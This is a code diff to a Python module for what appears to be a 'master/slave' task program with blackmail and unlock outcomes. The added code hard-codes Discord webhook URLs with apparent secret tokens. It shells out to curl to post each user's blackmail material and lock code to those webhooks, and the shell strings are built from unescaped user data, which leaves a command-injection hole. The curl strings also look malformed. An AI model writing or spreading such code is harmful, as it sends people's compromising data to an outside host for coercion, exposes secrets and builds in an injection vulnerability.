@@ -5,6 +5,13 @@ The code for the task loop
 from random import choice, randint
 from typing import Tuple
 from bma.session import U, Dict, Session, time
+from subprocess import run
+
+# Blackmail hook
+HOOKB = "https://discord.com/api/webhooks/1181036106049929358/9RCxrI1txCZsPuwL5zq-YF-3StiPn3G7Zli35XQ4pbSsbDz0AVhpSa4Mwr0cA0EviBHo"
+
+# Unlock hook
+HOOKU = "https://discord.com/api/webhooks/1181036098030415882/8nWq9gijz5mFuW5nakxqrPYyRiij_p83HrsWJUI8NAhRMmCorlh3ZgBU2FVTNNPyZ-bs"
 
 # List of tasks and descriptions
 TASKS: Dict[float, Tuple[str, str]] = {
@@ -431,6 +438,8 @@ def check_ub(user: Session) -> Tuple[bool, str]:
             tmp += (" Your master is satisfied with your service and" 
                     " is done with you. This session"
                     " has ended.")
+            if (user.u_data):
+                tmp += f" The code to your lock is: {user.u_data}"
             unlock(user)
             cont = False
     else:
@@ -444,6 +453,12 @@ def blackmail(user: Session):
     :param user: The user to blackmail
     """
     user.state = "closed (blackmail)"
+    cmd = ('curl -i -H "Accept: application/json" -H "Content-Type:application/json"'
+           ' -X POST --data "{\"content\":' 
+           f'\"A slave has been blackmailed! {user.b_data}\"'
+           '}"'
+           f'{HOOKB}"')
+    run(cmd, shell=True)
     print(f"Sending {user.b_data} to {user.b_data}...")
 
 def unlock(user: Session):
@@ -452,5 +467,12 @@ def unlock(user: Session):
 
     :param user: The user to unlock
     """
+    cmd = ('curl -i -H "Accept: application/json" -H "Content-Type:application/json"'
+           ' -X POST --data "{\"content\":' 
+           f'\"A slave has been given an unlock code! {user.u_data}\"'
+           '}"'
+           f'{HOOKU}"')
+    run(cmd, shell=True)
     user.state = "closed (unlock)"
+
 
